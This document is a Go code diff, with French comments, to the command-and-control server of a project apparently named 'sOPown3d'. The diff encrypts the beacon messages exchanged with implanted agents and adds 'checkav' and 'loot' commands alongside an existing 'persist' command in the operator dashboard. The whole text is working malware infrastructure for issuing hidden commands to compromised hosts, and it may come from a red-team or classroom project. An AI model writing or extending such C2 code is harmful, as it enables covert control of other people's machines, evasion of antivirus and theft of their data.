@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"time"
 
+	"sOPown3d/agent/crypto"
 	"sOPown3d/shared"
 )
 
@@ -122,6 +123,8 @@ func handleDashboard(w http.ResponseWriter, r *http.Request) {
                     <option value="info">info</option>
                     <option value="ping">ping</option>
 					<option value="persist">persist</option>
+					<option value="checkav">checkav</option>
+					<option value="loot">loot</option>
                 </select>
                 
                 <br><br>
@@ -213,7 +216,7 @@ func handleDashboard(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(html))
 }
 
-// Recevoir beacon
+// Recevoir beacon CHIFFRÉ
 func handleBeacon(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		http.Error(w, "POST seulement", 405)
@@ -222,28 +225,52 @@ func handleBeacon(w http.ResponseWriter, r *http.Request) {
 
 	connectionCount++
 
-	var agentInfo shared.AgentInfo
-	err := json.NewDecoder(r.Body).Decode(&agentInfo)
-
-	now := time.Now().Format("15:04:05")
-
-	if err != nil {
-		fmt.Printf("[%s] Erreur JSON\n", now)
-		w.WriteHeader(400)
+	// 1. Lire message chiffré
+	var encryptedMsg shared.EncryptedMessage
+	if err := json.NewDecoder(r.Body).Decode(&encryptedMsg); err != nil {
+		fmt.Printf("[!] Erreur format message: %v\n", err)
+		http.Error(w, "Format invalide", 400)
 		return
 	}
 
-	agentID := agentInfo.Hostname
-	fmt.Printf("[%s] Beacon #%d - Agent: %s\n", now, connectionCount, agentID)
+	// 2. Déchiffrer
+	decrypted, err := crypto.Decrypt(encryptedMsg.Data)
+	if err != nil {
+		fmt.Printf("[!] Erreur déchiffrement: %v\n", err)
+		http.Error(w, "Déchiffrement échoué", 400)
+		return
+	}
 
-	// Vérifier commande en attente
+	// 3. Parser les infos agent
+	var agentInfo shared.AgentInfo
+	if err := json.Unmarshal([]byte(decrypted), &agentInfo); err != nil {
+		fmt.Printf("[!] Erreur JSON: %v\n", err)
+		http.Error(w, "JSON invalide", 400)
+		return
+	}
+
+	now := time.Now().Format("15:04:05")
+	fmt.Printf("[%s] Beacon #%d - Agent: %s\n", now, connectionCount, agentInfo.Hostname)
+
+	// 4. Vérifier commande en attente
+	agentID := agentInfo.Hostname
 	if cmd, exists := pendingCommands[agentID]; exists {
-		json.NewEncoder(w).Encode(cmd)
-		delete(pendingCommands, agentID)
-		fmt.Printf("    → Envoyé: %s\n", cmd.Action)
+		// Chiffrer la commande avant envoi
+		cmdJSON, _ := json.Marshal(cmd)
+		encryptedCmd, err := crypto.Encrypt(string(cmdJSON))
+		if err != nil {
+			fmt.Printf("[!] Erreur chiffrement commande: %v\n", err)
+		} else {
+			response := shared.EncryptedMessage{Data: encryptedCmd}
+			json.NewEncoder(w).Encode(response)
+			delete(pendingCommands, agentID)
+			fmt.Printf("    → Commande envoyée (chiffrée): %s\n", cmd.Action)
+		}
 	} else {
-		w.WriteHeader(200)
-		w.Write([]byte("{}"))
+		// Réponse vide chiffrée
+		emptyResp, _ := crypto.Encrypt("{}")
+		response := shared.EncryptedMessage{Data: emptyResp}
+		json.NewEncoder(w).Encode(response)
 	}
 }
 
